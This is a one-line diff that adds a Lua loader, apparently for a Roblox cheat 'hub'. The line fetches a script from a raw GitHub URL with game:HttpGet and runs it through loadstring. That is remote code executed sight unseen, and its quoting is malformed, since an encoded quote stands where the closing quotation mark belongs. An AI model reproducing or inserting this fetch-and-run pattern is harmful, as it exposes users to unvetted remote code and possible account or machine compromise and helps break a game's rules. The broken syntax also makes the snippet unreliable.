@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/NoUGotbannedlol/DaHub/main/Shazam-RedorGreen%22), true))()
